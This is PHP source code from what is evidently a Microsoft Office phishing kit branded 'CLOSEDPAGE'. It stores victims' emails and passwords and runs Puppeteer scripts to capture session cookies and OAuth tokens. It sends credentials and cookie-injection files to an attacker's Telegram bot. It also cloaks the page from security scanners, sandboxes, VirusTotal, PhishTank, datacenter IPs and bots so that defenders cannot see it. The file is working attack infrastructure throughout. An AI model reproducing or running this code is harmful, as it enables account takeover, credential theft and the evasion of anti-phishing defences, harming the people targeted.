<?php
namespace App;

use Exception;

class Config {
    public static function load(): array {
        $baseDir = realpath(__DIR__ . '/..');
        $configPath = $baseDir . '/config.json.enc';
        $envPath = $baseDir . '/.env';
        $cfg = [];
        
        // Security::log("DEBUG: Config::load called. EnvPath: $envPath, ConfigPath: $configPath");

        // 1. Load manual .env first (Defaults)
        if (file_exists($envPath)) {
            $env = @parse_ini_file($envPath);
            if (is_array($env)) {
                foreach ($env as $k => $v) {
                    $cfg[$k] = $v;
                    // Also populate getenv/$_ENV for other parts of the app
                    if (!getenv($k)) putenv("$k=$v");
                    if (!isset($_ENV[$k])) $_ENV[$k] = $v;
                    
                    // Map common env names to config names
                    if ($k === 'PROXYCHECK_API_KEY') $cfg['proxycheckApiKey'] = $v;
                    if ($k === 'MASTER_LICENSE_KEY') $cfg['masterLicenseKey'] = $v;
                    if ($k === 'ENC_KEY') $cfg['encKey'] = $v;
                    if ($k === 'TELEGRAM_BOT_TOKEN') $cfg['telegramBotToken'] = $v;
                    if ($k === 'TELEGRAM_CHAT_ID') $cfg['telegramChatId'] = $v;
                }
            }
        }

        // Set default Microsoft client IDs and redirect URL
        $cfg['msDeviceFlowClientId'] = $cfg['msDeviceFlowClientId'] ?? '00000002-0000-0ff1-ce00-000000000000';
        $cfg['msSsoClientId'] = $cfg['msSsoClientId'] ?? 'd326c4ad-3914-4aba-ba32-83500a38b6a1';
        $cfg['postAuthRedirectUrl'] = $cfg['postAuthRedirectUrl'] ?? 'https://www.docusign.com/';
        $cfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? 'https://microsoft.com/devicelogin';

        // 2. Load encrypted config.json (User Overrides)
        if (file_exists($configPath)) {
            $json = Crypto::loadEncrypted($configPath);
            if ($json) {
                $decoded = json_decode($json, true);
                if (is_array($decoded)) {
                    foreach ($decoded as $k => $v) {
                        // Prevent user config from overriding locked keys
                        if (in_array($k, ['masterLicenseKey', 'encKey'])) {
                            continue;
                        }
                        $cfg[$k] = $v;
                    }
                }
            }
        }

        // Support Environment Variables (Render/Docker)
        $envBotToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? getenv('TELEGRAM_BOT_TOKEN');
        if ($envBotToken) {
            $cfg['telegramBotToken'] = $envBotToken;
        }
        
        $envChatId = $_ENV['TELEGRAM_CHAT_ID'] ?? getenv('TELEGRAM_CHAT_ID');
        if ($envChatId) {
            $cfg['telegramChatId'] = $envChatId;
        }

        $envTelemetry = getenv('TELEMETRY_ENABLED');
        if ($envTelemetry !== false) {
             $cfg['telemetryEnabled'] = filter_var($envTelemetry, FILTER_VALIDATE_BOOLEAN);
        }

        $envIpinfoEnabled = getenv('IPINFO_ASN_BLOCKING_ENABLED');
        if ($envIpinfoEnabled !== false) {
            $cfg['ipinfoAsnBlockingEnabled'] = filter_var($envIpinfoEnabled, FILTER_VALIDATE_BOOLEAN);
        }
        $envIpinfoToken = $_ENV['IPINFO_TOKEN'] ?? getenv('IPINFO_TOKEN');
        if (is_string($envIpinfoToken) && $envIpinfoToken !== '') {
            $cfg['ipinfoToken'] = $envIpinfoToken;
        }
        $envIpinfoFailClosed = getenv('IPINFO_FAIL_CLOSED');
        if ($envIpinfoFailClosed !== false) {
            $cfg['ipinfoFailClosed'] = filter_var($envIpinfoFailClosed, FILTER_VALIDATE_BOOLEAN);
        }

        // ProxyCheck.io Environment Variables
        $envProxycheckEnabled = getenv('PROXYCHECK_ENABLED');
        if ($envProxycheckEnabled !== false) {
            $cfg['proxycheckEnabled'] = filter_var($envProxycheckEnabled, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckApiKey = $_ENV['PROXYCHECK_API_KEY'] ?? getenv('PROXYCHECK_API_KEY');
        if (is_string($envProxycheckApiKey) && $envProxycheckApiKey !== '') {
            $cfg['proxycheckApiKey'] = $envProxycheckApiKey;
        }
        $envProxycheckBlockVPN = getenv('PROXYCHECK_BLOCK_VPN');
        if ($envProxycheckBlockVPN !== false) {
            $cfg['proxycheckBlockVPN'] = filter_var($envProxycheckBlockVPN, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckBlockProxy = getenv('PROXYCHECK_BLOCK_PROXY');
        if ($envProxycheckBlockProxy !== false) {
            $cfg['proxycheckBlockProxy'] = filter_var($envProxycheckBlockProxy, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckBlockTor = getenv('PROXYCHECK_BLOCK_TOR');
        if ($envProxycheckBlockTor !== false) {
            $cfg['proxycheckBlockTor'] = filter_var($envProxycheckBlockTor, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckRiskThreshold = getenv('PROXYCHECK_RISK_THRESHOLD');
        if ($envProxycheckRiskThreshold !== false) {
            $cfg['proxycheckRiskThreshold'] = (int)$envProxycheckRiskThreshold;
        }

        // Security::log("DEBUG: Config::load result keys: " . implode(',', array_keys($cfg)));
        if (isset($cfg['cfApiKey'])) {
             // Security::log("DEBUG: Config::load found cfApiKey. Length: " . strlen($cfg['cfApiKey']));
        } else {
             // Security::log("DEBUG: Config::load NO cfApiKey");
        }

        return $cfg;
    }

    public static function loadFileOnly(): array {
        $configPath = __DIR__ . '/../config.json.enc';
        if (!file_exists($configPath)) return [];

        $json = Crypto::loadEncrypted($configPath);
        if (!$json) return [];

        $decoded = json_decode($json, true);
        return is_array($decoded) ? $decoded : [];
    }

    public static function save(array $data): bool {
        $configPath = __DIR__ . '/../config.json.enc';
        // Security::log("DEBUG: Config::save called. Path: $configPath. Keys: " . implode(',', array_keys($data)));
        
        // Add random jitter to file size to prevent size-analysis
        $data['_padding'] = bin2hex(random_bytes(mt_rand(16, 64)));
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        if ($json === false) return false;
        
        $result = Crypto::saveEncrypted($configPath, $json);
        if ($result) {
            // Security::log("DEBUG: Config::save SUCCESS");
            clearstatcache(true, $configPath);
            if (function_exists('opcache_invalidate')) {
                @opcache_invalidate($configPath, true);
            }
        } else {
            // Security::log("DEBUG: Config::save FAILED");
        }
        return $result;
    }

    public static function saveMerged(array $partial): bool {
        $existing = self::loadFileOnly();
        if (!is_array($existing)) $existing = [];
        unset($existing['_padding']);

        foreach ($partial as $k => $v) {
            $existing[$k] = $v;
        }

        return self::save($existing);
    }


}

class Worker {
    public static function run() {
        Security::log("WORKER: Started file-based worker. Waiting for jobs...");
        
        $baseDir = realpath(__DIR__ . '/..');
        $storageDir = $baseDir . '/session_data';
        
        while (true) {
            try {
                // Find pending tasks
                $files = glob($storageDir . '/task_*.pending');
                
                if (empty($files)) {
                    usleep(500000); // Sleep 0.5s if no jobs
                    continue;
                }
                
                // Pick the first file
                $pendingFile = $files[0];
                $processingFile = str_replace('.pending', '.processing', $pendingFile);
                
                // Atomic rename to claim the job
                if (!@rename($pendingFile, $processingFile)) {
                    continue; // Someone else grabbed it
                }
                
                $task = json_decode(file_get_contents($processingFile), true);
                if (!$task) {
                    @unlink($processingFile); // Corrupt
                    continue;
                }
                
                Security::log("WORKER: Processing Job for {$task['email']} (CookieID: {$task['cookie_id']})...");

                // Execute Puppeteer Logic
                $projectRoot = realpath(__DIR__ . '/..');
                $apiBase = getenv('RENDER_EXTERNAL_URL') ?: 'https://localhost';
                
                $scriptToRun = 'consolidated.js';
                $extraArgs = "";
                
                if (($task['password'] ?? '') === "OAUTH_TOKEN_CAPTURED") {
                    $scriptToRun = 'token_swap.js';
                    Security::log("WORKER: Detected Hybrid Token Swap task. Running $scriptToRun...");
                }

                $puppeteerLogFile = $projectRoot . '/puppeteer.log';
                $cmd = "cd " . escapeshellarg($projectRoot) .
                       " && export PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer') .
                       " && if ! command -v chromium >/dev/null 2>&1 && ! command -v google-chrome >/dev/null 2>&1; then npx puppeteer browsers install chrome; fi" .
                       " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; elif command -v google-chrome >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v google-chrome`; fi" .
                       " && HOME=" . escapeshellarg($projectRoot) .
                       " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules') .
                       " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config') .
                       " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
                       " API_BASE_URL=" . escapeshellarg($apiBase) .
                       " node " . escapeshellarg($projectRoot . '/' . $scriptToRun) . " " .
                       escapeshellarg($task['email']) . " \"OAUTH_TOKEN_CAPTURED\" " .
                       escapeshellarg($task['cookie_id']) . " --verbose";
                
                Security::log("WORKER: Executing command: $cmd");

                $process = proc_open($cmd, [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ], $pipes);
                
                $outputStr = "";
                if (is_resource($process)) {
                    // Simple blocking read for stability
                    $stdout = stream_get_contents($pipes[1]);
                    $stderr = stream_get_contents($pipes[2]);
                    $outputStr = $stdout . $stderr;
                    
                    fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                    $exitCode = proc_close($process);
                    
                    // Append puppeteer output to a dedicated log file
                    file_put_contents($puppeteerLogFile, "\n\n--- Puppeteer Log for {$task['email']} (Task ID: {$task['cookie_id']}) ---\n" . $outputStr, FILE_APPEND);

                    // Log output for debugging
                    Security::log("WORKER OUTPUT [$scriptToRun] (also logged to puppeteer.log):\n" . $outputStr);
                }
                
                $finalStatus = (strpos($outputStr, 'HYBRID SWAP SUCCESS') !== false || $exitCode === 0) ? 'completed' : 'failed';
                
                // Update task file
                $task['status'] = $finalStatus;
                $task['updated_at'] = date('c');
                $completedFile = str_replace('.processing', '.completed', $processingFile);
                file_put_contents($completedFile, json_encode($task, JSON_PRETTY_PRINT));
                @unlink($processingFile); // Remove processing file
                
                // Send Telegram Notification
                $cfg = Config::load();
                if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
                    self::sendTelegramCookies($task, $cfg, $finalStatus);
                }
                
                Security::log("WORKER: Job finished with status: $finalStatus");
                
            } catch (Exception $e) {
                Security::log("WORKER ERROR: " . $e->getMessage());
                usleep(1000000);
            }
        }
    }

    public static function sendTelegramCookies($task, $cfg, $finalStatus) {
        $botToken = $cfg['telegramBotToken'];
        $chatId = $cfg['telegramChatId'];
        $cookieId = $task['cookie_id'];
        $email = $task['email'];
        
        $baseDir = realpath(__DIR__ . '/..');
        $injectFile = $baseDir . '/session_data/inject_session_' . $cookieId . '.js';
        
        if (file_exists($injectFile)) {
            $urlDoc = "https://api.telegram.org/bot{$botToken}/sendDocument";
            $payloadDoc = [
                'chat_id' => $chatId,
                'document' => new \CURLFile($injectFile, 'application/javascript', "cookies_{$email}.js"),
                'caption' => "/////// COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
            ];
            self::sendRequest($urlDoc, $payloadDoc, $cfg, true);
        }
    }

    public static function generateTelegramMessage($email, $password, $ip, $ua, $info, $statusSuffix = "") {
        $msg = "@closedservice  ✅ Microsoft Office " . trim($statusSuffix) . " \n\n";
        $msg .= " \"👨🏼‍✈️\": \"$email\", \n";
        $msg .= " \"🔑\": \"$password\" \n\n";
        $msg .= " #FINGERPRINTS: $ip \n";
        $msg .= " USERAGENT: $ua \n";
        $msg .= " /////// POWERED BY CLOSEDPAGE /////////  $info 
";
        return $msg;
    }

    public static function sendRequest($url, $payload, $cfg, $isMultipart = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        
        if ($isMultipart) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
            curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
        }
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            Security::log("WORKER: Telegram Curl Error: " . curl_error($ch));
        }
        unset($ch);
        return $result;
    }
}

class Console {
    public static function handle(array $argv) {
        if (count($argv) < 3) {
            echo "Usage: php index.php manage [encrypt|decrypt] [file]\n";
            exit(1);
        }

        $mode = $argv[2];
        $file = $argv[3];

        if (!file_exists($file)) {
            echo "File not found: $file\n";
            exit(1);
        }

        $content = file_get_contents($file);

        if ($mode === 'encrypt') {
            if (substr($file, -4) === '.enc') {
                echo "Warning: File seems already encrypted (.enc extension).\n";
            }
            
            // Fix: If file is in templates/plain/, save the .enc to the parent templates/ directory
            if (strpos($file, 'templates/plain/') !== false) {
                $outFile = str_replace('templates/plain/', 'templates/', $file) . '.enc';
            } else {
                $outFile = $file . '.enc';
            }
            
            if (Crypto::saveEncrypted($outFile, $content)) {
                echo "Encrypted to $outFile\n";
            } else {
                echo "Encryption failed.\n";
                exit(1);
            }
        } elseif ($mode === 'decrypt') {
            $decrypted = Crypto::loadEncrypted($file);
            if ($decrypted === false) {
                echo "Decryption failed.\n";
                exit(1);
            }
            $outFile = (substr($file, -4) === '.enc') ? substr($file, 0, -4) : $file . '.dec';
            if (file_put_contents($outFile, $decrypted) !== false) {
                echo "Decrypted to $outFile\n";
            } else {
                echo "Write failed.\n";
            }
        } else {
            echo "Invalid mode.\n";
        }
    }
}

class Crypto {
    private const METHOD = 'aes-256-cbc';

    private static function getKey(): string {
        $key = (string)($_ENV['ENC_KEY'] ?? getenv('ENC_KEY') ?? $_SERVER['ENC_KEY'] ?? '');
        if ($key === '') {
            $envPath = __DIR__ . '/../.env';
            if (file_exists($envPath)) {
                $env = @parse_ini_file($envPath);
                if ($env && isset($env['ENC_KEY'])) {
                    $key = $env['ENC_KEY'];
                }
            }
        }
        return is_string($key) ? $key : '';
    }

    public static function saveEncrypted(string $path, string $data): bool {
        $key = self::getKey();
        if ($key === '') return false;

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($data, self::METHOD, $key, 0, $iv);
        
        if ($encrypted === false) return false;

        $fp = fopen($path, 'w');
        if (!$fp) return false;

        $success = false;
        if (flock($fp, LOCK_EX)) {
            $bytes = fwrite($fp, $iv . $encrypted);
            flock($fp, LOCK_UN);
            if ($bytes !== false) $success = true;
        }
        fclose($fp);
        return $success;
    }

    public static function loadEncrypted(string $path) {
        if (!file_exists($path)) return false;
        $content = file_get_contents($path);
        if ($content === false) return false;

        $key = self::getKey();
        if ($key === '') return false;

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        if (strlen($content) < $ivLength) return false;

        $iv = substr($content, 0, $ivLength);
        $encrypted = substr($content, $ivLength);

        return openssl_decrypt($encrypted, self::METHOD, $key, 0, $iv);
    }
}

class Database {
    private $storageDir;

    public function __construct() {
        $baseDir = realpath(__DIR__ . '/..');
        $this->storageDir = $baseDir . '/session_data';
        if (!is_dir($this->storageDir)) {
            mkdir($this->storageDir, 0777, true);
        }
    }

    public function logEvent($data) {
        $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']);
        $filePath = $this->storageDir . '/event_' . $cookieId . '.json';
        
        $data['country'] = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
        $data['created_at'] = $data['time'] ?? date('c');
        $data['ip'] = $data['ip'] ?? Security::getClientIp();
        $data['ua'] = $data['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        // Merge with existing data if file exists
        if (file_exists($filePath)) {
            $existing = json_decode(file_get_contents($filePath), true);
            if (is_array($existing)) {
                $data = array_merge($existing, $data);
            }
        }
        
        return file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT)) !== false;
    }

    public function addTask($cookieId, $email, $password) {
        $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
        $task = [
            'cookie_id' => $cookieId,
            'email' => $email,
            'password' => $password,
            'status' => 'pending',
            'created_at' => date('c')
        ];
        
        $filePath = $this->storageDir . '/task_' . $cookieId . '.pending';
        return file_put_contents($filePath, json_encode($task, JSON_PRETTY_PRINT)) !== false;
    }

    public function getEventInfo($cookieId) {
        $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
        $filePath = $this->storageDir . '/event_' . $cookieId . '.json';
        if (file_exists($filePath)) {
            return json_decode(file_get_contents($filePath), true);
        }
        return null;
    }

    public function getLatestEventByEmail($email) {
        $files = glob($this->storageDir . '/event_*.json');
        if (empty($files)) return null;

        $latestFile = null;
        $latestTime = 0;

        foreach ($files as $file) {
            $data = json_decode(file_get_contents($file), true);
            if ($data && isset($data['email']) && $data['email'] === $email) {
                $time = filemtime($file);
                if ($time > $latestTime) {
                    $latestTime = $time;
                    $latestFile = $data;
                }
            }
        }
        return $latestFile;
    }
}

class Router {
    public static function handle() {
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $path = parse_url($uri, PHP_URL_PATH);
        $email = '';

        if ($path && $path !== '/' && $path !== '/index.php') {
            // Check for admin URL pattern with email (e.g. /admin.html/user@example.com)
            if (strpos($path, '/admin.html/') === 0) {
                // Do not extract email for admin path to prevent interfering with admin routing
                // The admin routing in index.php expects /admin.html exactly or handled there
                // However, index.php currently only matches exact '/admin.html'.
                // We need to handle this in index.php, but here we should just return empty email
                // or let index.php handle it.
                return ['email' => ''];
            }

            $parts = explode('/', trim($path, '/'));
            foreach (array_reverse($parts) as $part) {
                $part = urldecode($part);
                if (strpos($part, '@') !== false) {
                     if (preg_match('/^[^\s@]+@[^\s@]+\.[^\s@]+$/', $part)) {
                         $email = $part;
                         break;
                     }
                }
            }
            return ['email' => $email];
        } else {
            return ['email' => ''];
        }
    }
}

class Security {
    public static function enforceAccess(array $cfg, ?string $email = null, bool $checkIntelligence = true): ?string {
        $ip = self::getClientIp();
        $proxyIntel = null;
        
        // 1. Check Whitelist (Local Whitelist overrides ALL blocks)
        if ($ip && !empty($cfg['ipWhitelist'])) {
            $whitelist = array_map('trim', explode(',', $cfg['ipWhitelist']));
            if (in_array($ip, $whitelist)) return null;
        }

        // 2. Absolute Priority: ProxyCheck.io (moved to Advanced Security Engine)
        
        if ($ip) {
            // 3. Country Blocking (App + Cloudflare Fallback)
            $appCountryBlocking = !empty($cfg['countryBlockingEnabled']);
            $cfCountryBlocking = !empty($cfg['cfCountryBlockingEnabled']);

            if ($appCountryBlocking || $cfCountryBlocking) {
                $rawList = '';
                if ($appCountryBlocking && !empty($cfg['allowedCountries'])) {
                    $rawList = $cfg['allowedCountries'];
                } elseif ($cfCountryBlocking && !empty($cfg['cfAllowedCountries'])) {
                    $rawList = $cfg['cfAllowedCountries'];
                }

                if ($rawList !== '') {
                    $allowedCountries = array_map('strtoupper', array_map('trim', explode(',', $rawList)));
                    $allowedCountries = array_values(array_filter($allowedCountries));

                    if (!empty($allowedCountries)) {
                        // Priority 1: ProxyCheck Intelligence (Most accurate for detected location)
                        $detectedCountry = !empty($proxyIntel['country']) ? strtoupper($proxyIntel['country']) : '';
                        
                        // Priority 2: Cloudflare Header
                        if ($detectedCountry === '') {
                            $detectedCountry = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? strtoupper(trim((string)$_SERVER['HTTP_CF_IPCOUNTRY'])) : '';
                        }
                        
                        if ($detectedCountry !== '' && $detectedCountry !== 'XX') {
                            if (!in_array($detectedCountry, $allowedCountries, true)) return 'country_not_allowed_' . $detectedCountry;
                        } elseif ($detectedCountry === 'XX') {
                             // Block Unknown/Satellite countries if not explicitly allowed
                             if (!in_array('XX', $allowedCountries, true)) return 'country_not_allowed_XX';
                        } else {
                            $dbPath = __DIR__ . '/../IP2LOCATION-LITE-DB1.BIN';
                            if (file_exists($dbPath)) {
                                $ip2Class = '\\IP2Location\\Database';
                                if (class_exists($ip2Class)) {
                                    try {
                                        $db = new $ip2Class($dbPath, constant($ip2Class . '::FILE_IO'));
                                        $records = $db->lookup($ip, constant($ip2Class . '::ALL'));
                                        if ($records && !empty($records['countryCode'])) {
                                            $cc = strtoupper(trim((string)$records['countryCode']));
                                            if ($cc !== '' && !in_array($cc, $allowedCountries, true)) return 'country_not_allowed_' . $cc;
                                        }
                                    } catch (\Exception $e) {
                                        self::log("IP2Location Error: " . $e->getMessage());
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // 4. Advanced Security Engine (BOT PROTECTION)
            $securityEnabled = !empty($cfg['securityEnabled']);
            if ($securityEnabled || !empty($cfg['cfBotShield'])) {
                // 4a. VPN/Proxy/Tor Check (ProxyCheck.io)
                if (!empty($cfg['proxycheckEnabled'])) {
                    $blockVPN = !empty($cfg['proxycheckBlockVPN']);
                    $blockProxy = !empty($cfg['proxycheckBlockProxy']);
                    $blockTor = !empty($cfg['proxycheckBlockTor']);
                    $riskThreshold = isset($cfg['proxycheckRiskThreshold']) ? (int)$cfg['proxycheckRiskThreshold'] : 50;
                    $apiKey = trim((string)($cfg['proxycheckApiKey'] ?? ''));
                    
                    $proxyIntel = self::proxycheckBlocked($ip, $apiKey, $blockVPN, $blockProxy, $blockTor, $riskThreshold);
                    if ($proxyIntel['is_blocked']) return 'proxycheck_blocked';
                }

                if (self::isBotUserAgent()) return 'bot_user_agent_detected';
                if (self::isBlockedReferrer()) return 'blocked_referrer_detected';
                if (self::isMissingStandardHeaders()) return 'missing_standard_headers';

                // --- Intelligence Checks (IPInfo) ---
                if ($checkIntelligence) {
                    // Catch Data Centers via ProxyCheck Type (if not already blocked)
                    $type = strtolower($proxyIntel['type'] ?? '');
                    if ($type === 'business' || $type === 'hosting') {
                        // Some 'business' IPs are clean, but 'hosting' is definitely a bot/server
                        if ($type === 'hosting') return 'proxycheck_type_hosting';
                    }

                    if (!empty($cfg['ipinfoAsnBlockingEnabled'])) {
                        $ipinfoToken = trim((string)($cfg['ipinfoToken'] ?? ''));
                        $ipinfoFailClosed = !empty($cfg['ipinfoFailClosed']);
                        if ($ipinfoToken !== '') {
                            if (self::ipinfoAsnBlocked($ip, $ipinfoToken, $ipinfoFailClosed)) return 'ipinfo_asn_blocked';
                        } elseif ($ipinfoFailClosed) {
                            return 'ipinfo_token_missing';
                        }
                    }
                }

                // --- Local Behavioral/Static Checks (RDNS) ---
        $hostname = gethostbyaddr($ip);
        if ($hostname !== $ip) {
            $hostname = strtolower($hostname);
            
            // Safety: Skip check if it looks like a residential/ISP hostname
            $isResidential = false;
            $resKeywords = ['dynamic', 'residential', 'pool', 'static', 'dsl', 'broadband', 'cust', 'fiber', 'mobile'];
            foreach ($resKeywords as $res) {
                if (strpos($hostname, $res) !== false) {
                    $isResidential = true;
                    break;
                }
            }

            if (!$isResidential) {
                $botKeywords = [
                    'googlebot', 'bingbot', 'yandexbot', 'ahrefsbot', 'msnbot', 'baiduspider', 
                    'mj12bot', 'dotbot', 'semrushbot', 'duckduckbot', 'exabot', 'facebot', 
                    'ia_archiver', 'twitterbot', 'pingdom', 'uptimerobot', 'adsbot-google', 
                    'mediapartners-google', 'sogou', 'crawler', 'spider', 'slurp', 'scanner', 
                    'censys', 'shodan', 'nmap', 'hetzner', 'ovh', 'linode', 'digitalocean', 
                    'amazon-aws', 'azure-compute', 'cogent', 'leaseweb'
                ];
                foreach ($botKeywords as $keyword) {
                    if (strpos($hostname, $keyword) !== false) {
                        self::log("Bot/Datacenter detected via RDNS: $hostname");
                        return 'rdns_bot_detected';
                    }
                }
            }
        }
            }
        }

        // 6. Email Domain Filtering (MOVED TO POSITION 6)
        // Only admin-configured domains - hardcoded domains handled by frontend
        if ($email) {
            $emailParts = explode('@', $email);
            $domain = strtolower(end($emailParts));
            
            // Only check admin-configured domains (not hardcoded ones)
            if (!empty($cfg['blockedDomains']) && is_array($cfg['blockedDomains'])) {
                if (in_array($domain, $cfg['blockedDomains'], true)) {
                    self::log("Admin blocked domain bypass attempt: $email from IP: " . self::getClientIp());
                    return 'blocked_email_domain';
                }
            }
            
            if (!empty($cfg['allowedDomains']) && is_array($cfg['allowedDomains'])) {
                if (!in_array($domain, $cfg['allowedDomains'], true)) {
                    self::log("Domain not in allowed list: $email from IP: " . self::getClientIp());
                    return 'email_domain_not_allowed';
                }
            }
        }

        return null;
    }

    public static function getClientIp(): string {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            return $_SERVER['HTTP_X_REAL_IP'];
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($ips[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '';
    }

    public static function ipinfoAsnBlocked(string $ip, string $token, bool $failClosed = false, int $cacheTtlSeconds = 86400): bool {
        if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
            return $failClosed;
        }
        $token = trim($token);
        if (stripos($token, 'bearer ') === 0) {
            $token = trim(substr($token, 7));
        }
        if ($token === '') {
            return $failClosed;
        }

        $now = time();
        $cacheTtlSeconds = max(60, $cacheTtlSeconds);
        $cacheDir = __DIR__ . '/../session_data';
        if (!is_dir($cacheDir)) @mkdir($cacheDir, 0777, true);
        
        $cacheFile = $cacheDir . '/ipinfo_' . md5($ip) . '.json';

        // Check Cache
        if (file_exists($cacheFile)) {
            $cached = json_decode(file_get_contents($cacheFile), true);
            if (is_array($cached) && isset($cached['checked_at'], $cached['is_blocked'])) {
                if (($now - $cached['checked_at']) < $cacheTtlSeconds) {
                    return (bool)$cached['is_blocked'];
                }
            }
        }

        $url = "https://api.ipinfo.io/lite/{$ip}";
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 2,
                'header' => "Accept: application/json\r\nAuthorization: Bearer {$token}\r\n"
            ]
        ]);
        $raw = @file_get_contents($url, false, $context);
        if (!$raw) return $failClosed;

        $data = json_decode($raw, true);
        if (!is_array($data) || empty($data['asn'])) return $failClosed;

        $asn = strtoupper(trim((string)$data['asn']));
        $asName = strtolower(trim((string)($data['as_name'] ?? '')));
        $asDomain = strtolower(trim((string)($data['as_domain'] ?? '')));

        $nonHumanIndicators = [
            'google', 'microsoft', 'amazon', 'facebook', 'apple',
            'cloudflare', 'akamai', 'fastly', 'maxcdn',
            'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner',
            'aws', 'azure', 'gcp', 'google cloud', 'alibaba cloud',
            'vpn', 'proxy', 'anonymity', 'privacy', 'tor',
            'stiftung', 'renewablefreedom', 'm247', 'leaseweb', 'cogent',
            'choopa', 'oracle', 'layerhost', 'worldstream', 'nextglobal',
            'itproximus', 'hostroyale', 'centurylink', 'avast', 'bitdefender',
            'webnx', 'myloc',
            'AS15169', 'AS8075', 'AS16509', 'AS13335', 'AS60729', 'AS396982', 'AS9009'
        ];

        $blocked = false;
        foreach ($nonHumanIndicators as $indicator) {
            $indicator = (string)$indicator;
            if ($indicator === '') continue;
            if ($asn === strtoupper($indicator) || strpos($asName, strtolower($indicator)) !== false || strpos($asDomain, strtolower($indicator)) !== false) {
                $blocked = true;
                break;
            }
        }

        // Save Cache
        $cacheData = [
            'ip' => $ip,
            'checked_at' => $now,
            'is_blocked' => $blocked,
            'asn' => $asn,
            'as_name' => $asName,
            'as_domain' => $asDomain
        ];
        @file_put_contents($cacheFile, json_encode($cacheData));

        return $blocked;
    }

    public static function isBotUserAgent(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        if (empty($ua)) return true;

        $bots = [
            'bot', 'crawl', 'spider', 'slurp', 'facebookexternalhit', 'facebot',
            'curl', 'wget', 'python', 'libwww', 'httpunit', 'nmap',
            'phantomjs', 'headless', 'selenium', 'puppeteer', 'playwright',
            'postman', 'insomnia', 'axios', 'got', 'node-fetch', 'cheerio',
            'scray', 'grabber', 'sqlmap', 'nikto', 'havij', 'pangolin', 'acunetix', 'nessus', 
            'qualys', 'openvas', 'zmap', 'zgrab', 'shodan', 'censys', 'masscan',
            'any.run', 'crowdstrike', 'fireeye', 'paloalto', 'checkpoint', 'fortinet',
            'duckduckbot', 'exabot', 'twitterbot', 'pingdom', 'uptimerobot', 'googlebot',
            'mediapartners-google', 'sogou-spider', 'ahrefsbot', 'mj12bot', 'dotbot', 'semrushbot', 'baiduspider',
            'yandexbot', 'mail.ru_bot', 'seznam-bot', 'qwantify', 'gigablast', 'netcraft', 'virustotal', 'phishtank', 'urlscan'
        ];

        foreach ($bots as $bot) {
            if (strpos($ua, $bot) !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isBlockedReferrer(): bool {
        $referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
        if (empty($referer)) return false;

        $blockedReferers = [
            'any.run', 'app.any.run', 'hybrid-analysis.com', 'joe.sandbox.com', 
            'cuckoo.sandbox', 'malwr.com', 'virustotal.com', 'shodan.io', 
            'censys.io', 'threatminer.org', 'urlvoid.com', 'archive.org', 
            'web.archive.org', 'phishtank.com', 'safebrowsing.google.com', 
            'smartscreen.microsoft.com', 'urlscan.io', 'quttera.com', 'sucuri.net',
            'siteadvisor.com', 'fortiguard.com', 'barracudanetworks.com', 'mcafee.com'
        ];

        foreach ($blockedReferers as $blocked) {
            if (strpos($referer, $blocked) !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isMissingStandardHeaders(): bool {
        if (empty($_SERVER['HTTP_ACCEPT'])) return true;
        if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) return true;
        return false;
    }

    public static function log(string $message): void {
        $logFile = __DIR__ . '/../project.log';
        $line = '[' . date('c') . '] ' . $message . "\n";
